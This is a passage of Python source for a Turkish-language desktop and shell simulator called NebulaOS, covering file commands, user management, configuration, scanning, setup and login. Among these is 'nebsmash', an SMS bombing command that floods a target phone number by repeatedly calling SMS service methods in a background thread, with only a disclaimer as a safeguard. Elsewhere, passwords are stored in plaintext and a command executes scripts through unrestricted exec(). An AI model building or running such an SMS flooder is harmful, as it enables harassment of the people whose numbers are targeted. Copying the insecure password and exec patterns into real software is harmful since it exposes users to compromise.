            print(f"Erişim Reddedildi: '{source_nebula_path}' kaynağından okuma yetkiniz yok.")
            return

        if os.path.isdir(full_destination_path):
            final_destination_path = os.path.join(full_destination_path, os.path.basename(full_source_path))
            nebula_final_destination_path = self.get_nebula_path_from_host_path(final_destination_path)
        else:
            final_destination_path = full_destination_path
            nebula_final_destination_path = destination_nebula_path

        if not self.check_permission(current_user, nebula_final_destination_path, "w"):
            print(f"Erişim Reddedildi: '{destination_nebula_path}' hedefine yazma yetkiniz yok.")
            return

        try:
            shutil.copy2(full_source_path, final_destination_path)
            print(f"'{source_nebula_path}' parçacığı '{destination_nebula_path}' konumuna kopyalandı.")
            self.update_status(f"Kopyalandı: {source_nebula_path} -> {destination_nebula_path}")
        except Exception as e:
            print(f"Kopyalama hatası: {e}")

    def nebmove(self, args):
        """
        nebmove: Bir "parçacığı" (dosyayı) bir "yörüngeden" (dizinden) diğerine "taşır".
        Kullanım: nebmove <kaynak_parçacık> <hedef_yörünge_veya_parçacık_adı>
        """
        if len(args) != 2:
            print("Kullanım: nebmove <kaynak_parçacık> <hedef_yörünge_veya_parçacık_adı>")
            return

        source_nebula_path = args[0]
        destination_nebula_path = args[1]

        full_source_path = self.get_full_nebula_path(source_nebula_path)
        full_destination_path = self.get_full_nebula_path(destination_nebula_path)

        if not os.path.exists(full_source_path):
            print(f"Hata: Kaynak parçacık/yörünge '{source_nebula_path}' bulunamadı.")
            return
        
        if not self.check_permission(current_user, source_nebula_path, "w"):
            print(f"Erişim Reddedildi: '{source_nebula_path}' kaynağından taşıma yetkiniz yok (silme yetkisi gerekli).")
            return

        if os.path.isdir(full_destination_path):
            final_destination_path = os.path.join(full_destination_path, os.path.basename(full_source_path))
            nebula_final_destination_path = self.get_nebula_path_from_host_path(final_destination_path)
        else:
            final_destination_path = full_destination_path
            nebula_final_destination_path = destination_nebula_path

        if not self.check_permission(current_user, nebula_final_destination_path, "w"):
            print(f"Erişim Reddedildi: '{destination_nebula_path}' hedefine yazma yetkiniz yok.")
            return

        try:
            shutil.move(full_source_path, final_destination_path)
            print(f"'{source_nebula_path}' parçacığı/yörüngesi '{destination_nebula_path}' konumuna taşındı.")
            self.update_status(f"Taşındı: {source_nebula_path} -> {destination_nebula_path}")
        except Exception as e:
            print(f"Taşıma hatası: {e}")

    def nebhelp(self, args):
        """
        nebhelp: Nebula komutları hakkında "yıldız haritası" (yardım) sağlar.
        Kullanım: nebhelp [komut_adı]
        """
        if not args:
            print("Nebula Komut Yıldız Haritası:")
            print("------------------------------")
            for cmd_name, cmd_func in self.commands.items():
                doc_lines = cmd_func.__doc__.strip().splitlines()
                if doc_lines:
                    print(f"  {cmd_name}: {doc_lines[0].split(':', 1)[1].strip()}")
                else:
                    print(f"  {cmd_name}: Açıklama yok.")
            print("\nDaha fazla bilgi için: nebhelp <komut_adı>")
        else:
            cmd_name = args[0]
            if cmd_name in self.commands:
                print(self.commands[cmd_name].__doc__)
            else:
                print(f"Hata: '{cmd_name}' adında bir Nebula komutu bulunamadı.")
        self.update_status("Yardım görüntülendi.")

    system_logs = []

    def add_log(self, message):
        """Sistem günlüklerine bir mesaj ekler."""
        self.system_logs.append(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {message}")

    def neblog(self, args):
        """
        neblog: Sistem "olay akışını" (log kayıtlarını) gösterir.
        Kullanım: neblog
        """
        if not self.system_logs:
            print("Sistem olay akışı boş.")
            return
        print("Sistem Olay Akışı:")
        print("--------------------")
        for log in self.system_logs:
            print(log)
        self.update_status("Sistem günlükleri görüntülendi.")

    def nebconfig(self, args):
        """
        nebconfig: Sistem "ayarlarını" (konfigürasyonunu) görüntüler veya değiştirir. Root yetkisi gerektirir.
        Bu bir simülasyondur, gerçek sistem ayarlarını değiştirmez.
        Kullanım: nebconfig [ayar_adı] [yeni_değer]
        """
        if current_user != "root":
            print("Erişim Reddedildi: Sistem ayarlarını yönetmek için root yetkisi gereklidir.")
            return

        if not args:
            print("Mevcut Sistem Ayarları (Kavramsal):")
            for key, value in system_config.items():
                print(f"  {key}: '{value}'")
            print("  display_mode: 'ASCII_Enhanced'")
            print("  log_level: 'Critical'")
            print("  network_status: 'Offline'")
            print("Kullanım: nebconfig <ayar_adı> [yeni_değer]")
            return
        
        setting_name = args[0]
        if len(args) == 2:
            new_value = args[1]
            if setting_name in system_config:
                system_config[setting_name] = new_value
                print(f"'{setting_name}' ayarı '{new_value}' olarak güncellendi.")
                self.save_config()
                if setting_name == "theme":
                    self.apply_theme(new_value)
                    print(f"Tema '{new_value}' olarak değiştirildi.")
            else:
                print(f"Hata: '{setting_name}' adında bir ayar bulunamadı.")
            self.add_log(f"Konfigürasyon değişikliği: {setting_name} olarak ayarlandı {new_value} tarafından {current_user}")
            self.update_status(f"Konfigürasyon güncellendi: {setting_name}")
        else:
            if setting_name in system_config:
                print(f"'{setting_name}' ayarının mevcut değeri: '{system_config[setting_name]}'")
            else:
                print(f"'{setting_name}' ayarının mevcut değeri: 'Varsayılan' (Simülasyon)")
            self.update_status(f"Konfigürasyon görüntülendi: {setting_name}")

    def nebuser(self, args):
        """
        nebuser: Kullanıcı "gezginlerini" (hesaplarını) yönetir. Root yetkisi gerektirir.
        Kullanım: nebuser <komut> [argümanlar]
        Komutlar: create <kullanıcı_adı> <parola>, delete <kullanıcı_adı>, list
        """
        global users
        if current_user != "root":
            print("Erişim Reddedildi: Kullanıcı gezginlerini yönetmek için root yetkisi gereklidir.")
            return

        if not args:
            print("Kullanım: nebuser <komut> [argümanlar]")
            print("Komutlar: create <kullanıcı_adı> <parola>, delete <kullanıcı_adı>, list")
            return
        
        sub_command = args[0]
        if sub_command == "list":
            print("Kayıtlı Gezginler:")
            for user_name in users.keys():
                print(f"  - {user_name}")
            self.update_status("Kullanıcılar listelendi.")
        elif sub_command == "create":
            if len(args) != 3:
                print("Kullanım: nebuser create <kullanıcı_adı> <parola>")
                return
            new_username = args[1]
            new_password = args[2]
            if new_username in users:
                messagebox.showerror("Kullanıcı Hatası", f"Hata: '{new_username}' gezgini zaten mevcut.")
                print(f"Hata: '{new_username}' gezgini zaten mevcut.")
            else:
                users[new_username] = new_password
                user_cosmic_dir = self.get_full_nebula_path(f"/cosmic/{new_username}")
                os.makedirs(user_cosmic_dir, exist_ok=True)
                print(f"'{new_username}' gezgini başarıyla oluşturuldu ve kozmik alanı hazırlandı.")
                self.add_log(f"Kullanıcı oluşturuldu: {new_username} tarafından {current_user}")
                self.update_status(f"Kullanıcı oluşturuldu: {new_username}")
        elif sub_command == "delete":
            if len(args) != 2:
                print("Kullanım: nebuser delete <kullanıcı_adı>")
                return
            del_username = args[1]
            if del_username == "root":
                messagebox.showerror("Kullanıcı Hatası", "Hata: 'root' gezgini silinemez.")
                print("Hata: 'root' gezgini silinemez.")
                return
            if del_username not in users:
                messagebox.showwarning("Kullanıcı Hatası", f"Hata: '{del_username}' gezgini bulunamadı.")
                print(f"Hata: '{del_username}' gezgini bulunamadı.")
            else:
                if messagebox.askyesno("Kullanıcı Silme Onayı", f"'{del_username}' gezginini silmek istediğinizden emin misiniz?"):
                    del users[del_username]
                    user_cosmic_dir = self.get_full_nebula_path(f"/cosmic/{del_username}")
                    if os.path.exists(user_cosmic_dir):
                        shutil.rmtree(user_cosmic_dir)
                        print(f"'{del_username}' gezgini ve kozmik alanı yok edildi.")
                    else:
                        print(f"'{del_username}' gezgini başarıyla silindi (kozmik alanı zaten yoktu).")
                    self.add_log(f"Kullanıcı silindi: {del_username} tarafından {current_user}")
                    self.update_status(f"Kullanıcı silindi: {del_username}")
                else:
                    print("Kullanıcı silme işlemi iptal edildi.")
                    self.update_status("Kullanıcı silme iptal edildi.")
        else:
            print(f"Hata: Geçersiz 'nebuser' komutu: '{sub_command}'.")

    def nebpass(self, args):
        """
        nebpass: Mevcut "gezginin" (kullanıcının) "kimlik doğrulama anahtarını" (parolasını) değiştirir.
        Kullanım: nebpass [kullanıcı_adı] (root için)
        """
        global users
        target_user = current_user

        if current_user == "root" and args:
            target_user = args[0]
            if target_user not in users:
                messagebox.showwarning("Kullanıcı Hatası", f"Hata: '{target_user}' gezgini bulunamadı.")
                print(f"Hata: '{target_user}' gezgini bulunamadı.")
                return

        elif current_user != "root" and args:
            messagebox.showerror("Erişim Reddedildi", "Sadece root diğer gezginlerin kimlik doğrulama anahtarını değiştirebilir.")
            print("Erişim Reddedildi: Sadece root diğer gezginlerin kimlik doğrulama anahtarını değiştirebilir.")
            return
        
        if target_user not in users:
            messagebox.showwarning("Kullanıcı Hatası", "Hata: Kimlik doğrulama anahtarı değiştirilecek gezgin bulunamadı.")
            print("Hata: Kimlik doğrulama anahtarı değiştirilecek gezgin bulunamadı.")
            return

        print(f"'{target_user}' gezgininin kimlik doğrulama anahtarını değiştir.")
        old_password = custom_askstring(self.master, "NebPass", "Mevcut anahtar:", show='*')
        if users[target_user] != old_password:
            messagebox.showerror("Parola Hatası", "Hata: Mevcut anahtar yanlış.")
            print("Hata: Mevcut anahtar yanlış.")
            return
        
        new_password = custom_askstring(self.master, "NebPass", "Yeni anahtar:", show='*')
        confirm_password = custom_askstring(self.master, "NebPass", "Yeni anahtarı tekrar girin:", show='*')

        if new_password != confirm_password:
            messagebox.showerror("Parola Hatası", "Hata: Yeni anahtarlar uyuşmuyor.")
            print("Hata: Yeni anahtarlar uyuşmuyor.")
            return
        
        users[target_user] = new_password
        print(f"'{target_user}' gezgininin kimlik doğrulama anahtarı başarıyla güncellendi.")
        self.add_log(f"Parola değiştirildi {target_user} için tarafından {current_user}")
        self.update_status(f"Parola güncellendi: {target_user}")

    def nebsmash(self, args):
        """
        nebsmash: Hedef telefon numarasına SMS bombardımanı başlatır (Pentest Aracı).
        Kullanım: nebsmash <telefon_numarası> [mail_adresi] [adet]
        UYARI: Bu araç sadece eğitim ve yasal test amaçlıdır. İzinsiz kullanımı yasa dışıdır.
        """
        if not args:
            print("Kullanım: nebsmash <telefon_numarası> [mail_adresi] [adet]")
            print("UYARI: Bu araç sadece eğitim ve yasal test amaçlıdır. İzinsiz kullanımı yasa dışıdır.")
            return

        phone_number = args[0]
        mail_address = args[1] if len(args) > 1 else ""
        count = int(args[2]) if len(args) > 2 else 1

        if not phone_number.isdigit() or len(phone_number) != 10:
            messagebox.showerror("NebSmash Hatası", "Hata: Geçersiz telefon numarası. 10 haneli olmalı ve sadece rakamlardan oluşmalı.")
            print("Hata: Geçersiz telefon numarası. 10 haneli olmalı ve sadece rakamlardan oluşmalı.")
            return
        
        if mail_address and ("@" not in mail_address or "." not in mail_address):
            messagebox.showerror("NebSmash Hatası", "Hata: Geçersiz mail adresi.")
            print("Hata: Geçersiz mail adresi.")
            return

        if messagebox.askyesno("NebSmash Onayı", f"Hedef: {phone_number}, Mail: {mail_address if mail_address else 'Rastgele'}, Adet: {count}\nBu işlemi başlatmak istediğinizden emin misiniz? (Yasal sorumluluk size aittir!)"):
            print(f"NebSmash başlatılıyor: Hedef: {phone_number}, Mail: {mail_address if mail_address else 'Rastgele'}, Adet: {count}")
            print("Lütfen bekleyin... Bu işlem biraz zaman alabilir.")
            self.add_log(f"NebSmash başlatıldı {phone_number} için tarafından {current_user}")
            self.update_status(f"NebSmash başlatıldı: {phone_number}")
            threading.Thread(target=self._run_smash_attack, args=(phone_number, mail_address, count)).start()
        else:
            print("NebSmash işlemi iptal edildi.")
            self.update_status("NebSmash iptal edildi.")

    def _run_smash_attack(self, phone, mail, count):
        """SMS saldırı mantığını çalıştırmak için dahili fonksiyon."""
        # Bu fonksiyon, terminal penceresi açıkken stdout'u doğru yere yönlendirmelidir.
        # Masaüstü ortamında, bu çıktılar doğrudan terminal penceresine gitmelidir.
        # Bu nedenle, SendSms sınıfına output_widget'ı geçirmek önemlidir.
        send_sms_instance = SendSms(phone, mail, sys.stdout.widget if hasattr(sys.stdout, 'widget') else None)
        
        servisler_sms = []
        for attribute in dir(send_sms_instance):
            attribute_value = getattr(send_sms_instance, attribute)
            if callable(attribute_value) and not attribute.startswith('__'):
                servisler_sms.append(attribute)

        current_sent = 0
        while current_sent < count:
            for service_func_name in servisler_sms:
                if current_sent >= count:
                    break
                try:
                    getattr(send_sms_instance, service_func_name)()
                    current_sent += 1
                except Exception as e:
                    print(f"Servis çağrısı hatası ({service_func_name}): {e}")
                
                time.sleep(0.1)

        print(f"NebSmash tamamlandı. Toplam gönderilen SMS: {send_sms_instance.adet}")
        self.add_log(f"NebSmash tamamlandı {phone} için. Gönderilen: {send_sms_instance.adet}")
        self.update_status(f"NebSmash tamamlandı. Gönderilen: {send_sms_instance.adet}")

    # --- YENİ ÖZELLİKLER ---

    def nebview(self, args):
        """
        nebview: Belirtilen "parçacığın" (dosyanın) içeriğini gösterir.
        Kullanım: nebview <parçacık_adı>
        """
        if not args:
            print("Kullanım: nebview <parçacık_adı>")
            return
        
        file_name = args[0]
        full_path = self.get_full_nebula_path(file_name)
        nebula_path = self.get_nebula_path_from_host_path(full_path)

        if not os.path.exists(full_path):
            print(f"Hata: '{file_name}' parçacığı bulunamadı.")
            return
        
        if os.path.isdir(full_path):
            print(f"Hata: '{file_name}' bir yörünge (dizin), parçacık değil.")
            return

        if not self.check_permission(current_user, nebula_path, "r"):
            print(f"Erişim Reddedildi: '{file_name}' parçacığını okuma yetkiniz yok.")
            return

        try:
            with open(full_path, 'r') as f:
                content = f.read()
            print(f"--- '{file_name}' Parçacık İçeriği ---")
            print(content)
            print("-----------------------------------")
        except Exception as e:
            print(f"Hata oluştu: {e}")
        self.add_log(f"Dosya görüntülendi: {file_name} tarafından {current_user}")
        self.update_status(f"Dosya görüntülendi: {file_name}")

    def nebdir(self, args):
        """
        nebdir: Yeni bir "yörünge" (dizin) oluşturur.
        Kullanım: nebdir <yörünge_adı>
        """
        if not args:
            print("Kullanım: nebdir <yörünge_adı>")
            return
        
        dir_name = args[0]
        full_path = self.get_full_nebula_path(dir_name)
        nebula_path = self.get_nebula_path_from_host_path(full_path)

        if not self.check_permission(current_user, current_directory, "w"):
            print(f"Erişim Reddedildi: Bu yörüngede yeni bir yörünge oluşturma yetkiniz yok.")
            return

        try:
            os.makedirs(full_path, exist_ok=True)
            print(f"'{dir_name}' yörüngesi oluşturuldu.")
        except Exception as e:
            print(f"Hata oluştu: {e}")
        self.add_log(f"Dizin oluşturuldu: {dir_name} tarafından {current_user}")
        self.update_status(f"Dizin oluşturuldu: {dir_name}")

    def nebstatus(self, args):
        """
        nebstatus: Sistem "kaynak akışını" (CPU, Bellek, Disk durumu) gösterir.
        Kullanım: nebstatus
        """
        print("NebulaOS Kaynak Akışı:")
        print("-----------------------")
        print(f"CPU Kullanımı: {uniform(10.0, 90.0):.2f}%")
        print(f"Bellek Kullanımı: {randint(25, 80)}% ({randint(1, 16)} GB Toplam)")
        
        total_size = 0
        for dirpath, dirnames, filenames in os.walk(NEBULA_ROOT):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                if not os.path.islink(fp):
                    total_size += os.path.getsize(fp)
        
        total_size_mb = total_size / (1024 * 1024)
        print(f"Disk Kullanımı: {total_size_mb:.2f} MB / 1024.00 MB (Simüle Edilmiş)")
        print("-----------------------")
        self.add_log(f"Sistem durumu kontrol edildi tarafından {current_user}")
        self.update_status("Sistem durumu görüntülendi.")

    def nebcom(self, args):
        """
        nebcom: Diğer "gezginlere" (kullanıcılara) "kozmik mesaj" gönderir.
        Kullanım: nebcom <hedef_gezgin> <mesaj>
        """
        if len(args) < 2:
            print("Kullanım: nebcom <hedef_gezgin> <mesaj>")
            return
        
        target_user_name = args[0]
        message = " ".join(args[1:])

        if target_user_name not in users:
            messagebox.showwarning("Mesaj Hatası", f"Hata: '{target_user_name}' adında bir gezgin bulunamadı.")
            print(f"Hata: '{target_user_name}' adında bir gezgin bulunamadı.")
            return
        
        if target_user_name == current_user:
            messagebox.showinfo("Mesaj Hatası", "Kendinize kozmik mesaj gönderemezsiniz.")
            print("Kendinize kozmik mesaj gönderemezsiniz.")
            return

        print(f"'{target_user_name}' gezginine kozmik mesaj gönderiliyor: '{message}'")
        self.add_log(f"Kozmik mesaj gönderildi {current_user}'dan {target_user_name}'e: '{message}'")
        self.update_status(f"Mesaj gönderildi: {target_user_name}")

    def nebinstall(self, args):
        """
        nebinstall: Yeni bir "yıldız gemisi" (uygulama) veya "modül" (paket) yükler.
        Kullanım: nebinstall <yükleme_adı>
        """
        if not args:
            print("Kullanım: nebinstall <yükleme_adı>")
            print("Mevcut yüklemeler: nebgame")
            return
        
        package_name = args[0].lower()
        install_path = self.get_full_nebula_path(f"/galaxy/{package_name}.neb")
        nebula_install_path = self.get_nebula_path_from_host_path(install_path)

        if not self.check_permission(current_user, "/galaxy", "w"):
            print(f"Erişim Reddedildi: Yeni yıldız gemisi yükleme yetkiniz yok.")
            return

        if package_name == "nebgame":
            if os.path.exists(install_path):
                print(f"'{package_name}' yıldız gemisi zaten yüklü.")
                return
            try:
                with open(install_path, 'w') as f:
                    f.write(f"# Nebula Oyun Uygulaması - {package_name}\n")
                    f.write("Basit bir konsol tabanlı oyun.\n")
                print(f"'{package_name}' yıldız gemisi başarıyla yüklendi. 'nebspawn {package_name}.neb' ile başlatabilirsiniz.")
            except Exception as e:
                print(f"Yükleme hatası: {e}")
        else:
            print(f"Hata: '{package_name}' adında bir yükleme bulunamadı veya desteklenmiyor.")
        self.add_log(f"Paket yükleme girişimi: {package_name} tarafından {current_user}")
        self.update_status(f"Yükleme denendi: {package_name}")

    def nebreport(self, args):
        """
        nebreport: Sistem "olay raporu" (sağlık ve güvenlik özeti) oluşturur.
        Kullanım: nebreport
        """
        print("NebulaOS Olay Raporu Oluşturuluyor...")
        print("-------------------------------------")
        print(f"Rapor Tarihi: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Aktif Kullanıcı: {current_user}")
        print(f"Sistem Çalışma Süresi: {randint(1, 24)} saat, {randint(0, 59)} dakika")
        print(f"Son Güvenlik Taraması: {datetime.datetime.now() - datetime.timedelta(days=randint(1, 30))} (Simüle Edilmiş)")
        print(f"Algılanan Anomali Sayısı: {randint(0, 5)}")
        print(f"Ağ Bağlantı Durumu: {'Aktif' if randint(0,1) else 'Pasif'}")
        print("-------------------------------------")
        print("Rapor tamamlandı. Detaylı loglar için 'neblog' kullanın.")
        self.add_log(f"Sistem raporu oluşturuldu tarafından {current_user}")
        self.update_status("Sistem raporu oluşturuldu.")

    def nebscan(self, args):
        """
        nebscan: Belirtilen "yörüngeyi" (dizini) "anomaliler" (büyük dosyalar, şüpheli isimler) için tarar.
        Kullanım: nebscan [yörünge_adı]
        """
        target_path = current_directory
        if args:
            target_path = args[0]

        full_path = self.get_full_nebula_path(target_path)
        nebula_path = self.get_nebula_path_from_host_path(full_path)

        if not os.path.exists(full_path):
            print(f"Hata: '{target_path}' yörüngesi bulunamadı.")
            return
        
        if not os.path.isdir(full_path):
            print(f"Hata: '{target_path}' bir yörünge değil, parçacık. Sadece yörüngeler taranabilir.")
            return

        if not self.check_permission(current_user, nebula_path, "r"):
            print(f"Erişim Reddedildi: '{target_path}' yörüngesini tarama yetkiniz yok.")
            return

        print(f"'{target_path}' yörüngesi anomaliler için taranıyor...")
        self.add_log(f"Dizin taranıyor: {target_path} tarafından {current_user}")
        self.update_status(f"Yörünge taranıyor: {target_path}")
        
        found_anomalies = False
        for root_dir, _, files in os.walk(full_path):
            for file_name in files:
                file_full_path = os.path.join(root_dir, file_name)
                file_size = os.path.getsize(file_full_path)
                
                if file_size > 1024 * 1024:
                    print(f"  [ANOMALİ] Büyük Parçacık Algılandı: {self.get_nebula_path_from_host_path(file_full_path)} ({file_size / (1024 * 1024):.2f} MB)")
                    found_anomalies = True
                
                if "temp" in file_name.lower() and file_size < 100:
                    print(f"  [ANOMALİ] Şüpheli Parçacık Adı: {self.get_nebula_path_from_host_path(file_full_path)}")
                    found_anomalies = True
        
        if not found_anomalies:
            print("Yörüngede herhangi bir anomali algılanmadı.")
        print(f"'{target_path}' yörünge taraması tamamlandı.")
        self.update_status(f"Tarama tamamlandı: {target_path}")

    def nebexec(self, args):
        """
        nebexec: Bir "parçacığı" (Python betiğini) NebulaOS ortamında yürütür.
        Kullanım: nebexec <parçacık_adı> [argümanlar]
        """
        if not args:
            print("Kullanım: nebexec <parçacık_adı> [argümanlar]")
            return
        
        script_name = args[0]
        script_args = args[1:]
        full_path = self.get_full_nebula_path(script_name)
        nebula_path = self.get_nebula_path_from_host_path(full_path)

        if not os.path.exists(full_path):
            print(f"Hata: '{script_name}' parçacığı bulunamadı.")
            return
        
        if not os.path.isfile(full_path):
            print(f"Hata: '{script_name}' bir parçacık değil.")
            return

        if not self.check_permission(current_user, nebula_path, "x"):
            print(f"Erişim Reddedildi: '{script_name}' parçacığını yürütme yetkiniz yok.")
            return

        print(f"'{script_name}' parçacığı yürütülüyor...")
        self.add_log(f"Betik yürütülüyor: {script_name} tarafından {current_user}")
        self.update_status(f"Betik yürütülüyor: {script_name}")
        
        try:
            with open(full_path, 'r') as f:
                script_content = f.read()
            
            # `input` fonksiyonunu CustomInputDialog ile değiştir.
            script_globals = {'__builtins__': __builtins__, 'print': print, 'input': lambda prompt: custom_askstring(self.master, "Betik Girişi", prompt), 'nebula_app': self}
            script_locals = {'args': script_args}

            exec(script_content, script_globals, script_locals)
            print(f"'{script_name}' yürütme tamamlandı.")
        except Exception as e:
            messagebox.showerror("Yürütme Hatası", f"Betik yürütme hatası: {e}")
            print(f"Yürütme hatası: {e}")
        self.add_log(f"Betik yürütme tamamlandı {script_name} için")
        self.update_status(f"Betik tamamlandı: {script_name}")

    def nebversion(self, args):
        """
        nebversion: NebulaOS'un mevcut sürümünü gösterir.
        Kullanım: nebversion
        """
        print(f"{SYSTEM_NAME} Sürüm: {OS_VERSION}")
        self.add_log(f"Sürüm kontrol edildi tarafından {current_user}")
        self.update_status(f"Sürüm: {OS_VERSION}")

    # --- Sistem Başlatma ve Kurulum ---
    def initialize_nebula_fs(self):
        """Simüle edilmiş NebulaOS dosya sistemi yapısını başlatır."""
        print("Nebula Dosya Sistemi başlatılıyor...")
        os.makedirs(NEBULA_ROOT, exist_ok=True)

        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    global system_config
                    loaded_config = json.load(f)
                    system_config.update(loaded_config)
                    self.apply_theme(system_config.get("theme", "dark_nebula"))
                self.add_log("Sistem konfigürasyonu yüklendi.")
            except Exception as e:
                print(f"Hata: Konfigürasyon dosyası yüklenemedi: {e}")
                self.add_log(f"Konfigürasyon yükleme hatası: {e}")

        for path in ["stellar", "cosmic", "void", "galaxy"]:
            os.makedirs(os.path.join(NEBULA_ROOT, path), exist_ok=True)
            self.add_log(f"Çekirdek Nebula dizini oluşturuldu: /{path}")

        for user_name in users.keys():
            user_cosmic_dir = os.path.join(NEBULA_ROOT, "cosmic", user_name)
            os.makedirs(user_cosmic_dir, exist_ok=True)
            with open(os.path.join(user_cosmic_dir, "profile.neb"), 'w') as f:
                f.write(f"Kullanıcı Profili: {user_name}\n")
                f.write("Bu sizin kişisel kozmik alanınızdır.\n")
            self.add_log(f"Kullanıcı kozmik alanı oluşturuldu: {user_name}")

        with open(os.path.join(NEBULA_ROOT, "stellar", "core.neb"), 'w') as f:
            f.write("NebulaOS Çekirdek Modülü v1.0\n")
        with open(os.path.join(NEBULA_ROOT, "galaxy", "nebcalc.neb"), 'w') as f:
            f.write("# Nebula Hesap Makinesi Uygulaması\n")
        with open(os.path.join(NEBULA_ROOT, "galaxy", "nebtext.neb"), 'w') as f:
            f.write("# Nebula Metin Düzenleyici Uygulaması\n")
        with open(self.get_full_nebula_path("/galaxy/nebgame.neb"), 'w') as f:
            f.write("# Nebula Oyun Uygulaması\n")
            f.write("print('Oyun başlatılıyor...')\n")
            f.write("import random\n")
            f.write("if random.randint(0,1):\n")
            f.write("    print('Kazandınız!')\n")
            f.write("else:\n")
            f.write("    print('Kaybettiniz!')\n")

        with open(self.get_full_nebula_path("/void/system.log"), 'w') as f:
            f.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Sistem başlatıldı.\n")
        
        with open(self.get_full_nebula_path("/cosmic/root/hello.neb"), 'w') as f:
            f.write("print('Merhaba Gezgin! Bu bir Python betiği simülasyonudur.')\n")
            f.write("if 'args' in locals() and args:\n")
            f.write("    print(f'Argümanlar: {args}')\n")
            f.write("if 'nebula_app' in locals():\n")
            f.write("    nebula_app.add_log('Merhaba betiği yürütüldü.')\n")

        self.add_log("Başlangıç sistem dosyaları oluşturuldu.")
        print("Nebula Dosya Sistemi hazır.")

    def save_config(self):
        """Mevcut sistem konfigürasyonunu bir dosyaya kaydeder."""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(system_config, f, indent=4)
            self.add_log("Sistem konfigürasyonu kaydedildi.")
        except Exception as e:
            print(f"Hata: Konfigürasyon kaydedilemedi: {e}")
            self.add_log(f"Konfigürasyon kaydetme hatası: {e}")

    def run_initial_setup(self):
        """
        İlk kurulum sürecini daha önce tamamlanmadıysa çalıştırır.
        Video simülasyonu, yükleme çubuğu ve konfigürasyon sorularını içerir.
        """
        if os.path.exists(SETUP_FLAG_FILE):
            self.show_loading_bar("Sistem Yükleniyor...", self.login_screen)
            return

        self.clear_screen()
        print(BOOT_LOGO)
        print("\nVideo Oynatılıyor: basla.mp4 (Gerçek Oynatma)...")
        print("Bu video, NebulaOS'un evrenine hoş geldiniz mesajını içeriyor.")
        self.add_log("Gerçek video oynatma denemesi: basla.mp4")
        self.master.update_idletasks()

        if 'pygame' in sys.modules and 'cv2' in sys.modules:
            video_thread = threading.Thread(target=play_video_pygame_in_separate_window, args=("basla.mp4",))
            video_thread.start()
            video_thread.join()
        else:
            print("Pygame veya OpenCV kurulu olmadığı için video oynatılamadı. Simülasyon devam ediyor.")
            time.sleep(3)

        self.clear_screen()
        print(BOOT_LOGO)
        print("\nNebulaOS İlk Kurulumu: Evrensel Ayarlar")
        self.add_log("İlk kurulum başlatılıyor.")

        lang_options = ["Türkçe", "English", "Français", "Deutsch"]
        language = custom_askstring(self.master, "Kurulum", "Dilinizi seçin:", initialvalue=system_config["language"])
        if language and language in lang_options:
            system_config["language"] = language
        else:
            print(f"Geçersiz dil seçimi, varsayılan '{system_config['language']}' kullanılıyor.")

        kb_options = ["QWERTY", "AZERTY", "QWERTZ"]
        keyboard_layout = custom_askstring(self.master, "Kurulum", "Klavye düzeninizi seçin:", initialvalue=system_config["keyboard_layout"])
        if keyboard_layout and keyboard_layout in kb_options:
            system_config["keyboard_layout"] = keyboard_layout
        else:
            print(f"Geçersiz klavye düzeni seçimi, varsayılan '{system_config['keyboard_layout']}' kullanılıyor.")

        country_options = ["Türkiye", "USA", "Germany", "France", "Japan"]
        country = custom_askstring(self.master, "Kurulum", "Ülkenizi seçin:", initialvalue=system_config["country"])
        if country and country in country_options:
            system_config["country"] = country
        else:
            print(f"Geçersiz ülke seçimi, varsayılan '{system_config['country']}' kullanılıyor.")
        
        theme_options = ["dark_nebula", "cosmic_dawn"]
        theme = custom_askstring(self.master, "Kurulum", "Temanızı seçin (dark_nebula, cosmic_dawn):", initialvalue=system_config["theme"])
        if theme and theme in theme_options:
            system_config["theme"] = theme
            self.apply_theme(theme)
        else:
            print(f"Geçersiz tema seçimi, varsayılan '{system_config['theme']}' kullanılıyor.")
        
        self.save_config()

        with open(SETUP_FLAG_FILE, 'w') as f:
            f.write("Kurulum tamamlandı.\n")
        self.add_log("İlk kurulum tamamlandı ve bayrak dosyası oluşturuldu.")

        self.show_loading_bar("Sistem Yükleniyor...", self.login_screen)

    def show_loading_bar(self, message, callback=None, duration_ms=2000):
        """Simüle edilmiş bir yükleme çubuğu görüntüler."""
        self.clear_screen()
        print(BOOT_LOGO)
        print(f"\n{message}")
        print(f"NebulaOS Sürüm: {OS_VERSION}")
        
        # Yükleme çubuğunu ana pencerede (masaüstü canvas üzerinde) göster
        progress_label = tk.Label(self.desktop_canvas, text="", bg=self.desktop_canvas.cget('bg'), fg=self.accent_color, font=self.prompt_font)
        progress_label.place(relx=0.5, rely=0.5, anchor='center') # Ortaya yerleştir

        num_frames = 20
        delay_per_frame = duration_ms // num_frames

        def update_progress(current_frame=0):
            if current_frame <= num_frames:
                progress_percent = int((current_frame / num_frames) * 100)
                filled_chars = int((current_frame / num_frames) * 20)
                bar = "[" + "#" * filled_chars + "-" * (20 - filled_chars) + "]"
                progress_label.config(text=f"{bar} {progress_percent}%")
                self.master.update_idletasks()
                self.master.after(delay_per_frame, update_progress, current_frame + 1)
            else:
                progress_label.destroy()
                if callback:
                    callback()
        
        update_progress()
        self.add_log(f"Yükleme çubuğu görüntülendi: {message}")

    def login_screen(self):
        """Kullanıcı girişi simpledialog kullanarak işler."""
        self.clear_screen()
        print(BOOT_LOGO)
        print(f"\nNebulaOS v{OS_VERSION}'a Hoş Geldiniz!")
        self.add_log("Oturum açma ekranı görüntülendi.")
        self.update_status("Oturum açma bekleniyor.")

        def show_login_dialog():
            global current_user
            username = custom_askstring(self.master, "NebulaOS Giriş", "Kullanıcı Adı:")
            if username is None:
                self.master.destroy()
                return

            password = custom_askstring(self.master, "NebulaOS Giriş", "Kimlik Doğrulama Anahtarı:", show='*')
            if password is None:
                self.master.destroy()
                return

            if username in users and users[username] == password:
                current_user = username
                self.clear_screen()
                print(BOOT_LOGO) # Boot logosunu tekrar yaz (masaüstü açılışında)
                print(f"\n🪐 NebulaOS::{current_user} >> Nebulaya hoş geldiniz, {current_user.capitalize()}!")
                self.add_log(f"Kullanıcı '{current_user}' başarıyla giriş yaptı.")
                self.update_status(f"Giriş yapıldı: {current_user}")
                # Oturum açtıktan sonra terminal çıktısını orijinaline döndür
